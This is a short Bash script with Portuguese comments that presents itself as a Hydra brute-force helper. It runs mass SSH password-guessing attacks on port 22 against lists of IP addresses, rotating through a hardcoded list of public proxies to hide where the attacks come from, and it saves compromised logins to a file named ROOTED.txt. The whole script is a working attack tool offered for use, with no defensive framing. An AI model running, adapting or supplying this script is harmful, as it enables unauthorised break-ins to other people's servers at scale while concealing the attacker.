#!/bin/bash
#
# Arquivo scan.sh
#
# Script auxiliar de Brute-Force com Hydra
#
# ins3ct, Junho de 2015
#
#
 
# Variáveis
 
proxies=(
        "HYDRA_PROXY_HTTP=http://124.254.57.150:8118"
        "HYDRA_PROXY_HTTP=http://124.202.173.210:8118"
        "HYDRA_PROXY_HTTP=http://211.141.130.112:8001"
        "HYDRA_PROXY_HTTP=http://222.88.236.235:80"
        "HYDRA_PROXY_HTTP=http://206.123.214.4:443"
        "HYDRA_PROXY_HTTP=http://124.254.57.150:8118"
        "HYDRA_PROXY_HTTP=http://111.161.65.79:80"
        "HYDRA_PROXY_HTTP=http://116.246.6.51:80"
)
 
num=0
pxy=0
pasta="ips/007"
num_files=$(ls $pasta | wc -l)
 
# Laços
 
clear
 
while [ $num -lt $num_files ]
do
        if [ $num -lt "10" ]
        then
                clear
                echo "Iniciando...."; sleep 1
                echo "Lendo arquivo $pasta/00$num de 0$num_files"; sleep 3
                echo -n "Configurando proxy"; sleep 1; echo -n "."; sleep 1; echo -n "."; sleep 1; echo -n ". "; sleep 2
                echo "OK!"
                echo; echo "Let's Rock!"
                export ${proxies[$pxy]}
                hydra -M $pasta/00$num ssh -s 22 -L usr.lst -P pass.lst -o ROOTED.txt -v -V -t 20 -f >> nosferatu.lst
                let "pxy = pxy + 1"
        else
                clear
                echo "Iniciando...."; sleep 1
                echo "Lendo arquivo $pasta/00$num"; sleep 3
                echo "Configurando proxy..."; sleep 5
                echo; echo; echo "Pronto!"
                export ${proxies[$pxy]}
                hydra -M $pasta/0$num ssh -s 22 -L usr.lst -P pass.lst -o ROOTED.txt -v -V -t 20 -f >> nosferatu.lst
                let "pxy = pxy + 1"
        fi
 
        if [ $pxy == ${#proxies[@]} ]; then
                pxy=0
        fi
 
        let "num = num + 1"
done
 
# END
